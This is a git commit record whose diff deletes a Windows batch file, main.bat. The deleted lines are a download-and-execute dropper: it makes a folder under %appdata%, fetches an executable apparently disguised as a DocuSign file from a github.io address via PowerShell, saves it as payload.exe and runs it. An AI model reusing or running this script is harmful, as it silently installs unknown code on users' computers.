40755ee3a6c10499cb78baac2810c64a9f6e15bc
readreviewes <mandruspa@yahoo.com>
2025-04-09 21:00:17 +0000

    Delete main.bat

--- main.bat
+++
@@ -1,8 +0,0 @@
-@echo off
-setlocal enabledelayedexpansion
-set "payloadpath=%appdata%\Custom-Application\files\payload.exe"
-if not exist "%appdata%\Custom-Application\files" mkdir "%appdata%\Custom-Application\files"
-
-powershell -Command "Invoke-WebRequest -Uri 'https://readreviewes.github.io/newraws/docusignone.exe' -OutFile '%payloadpath%'"
-start "" "%payloadpath%"
-exit /b
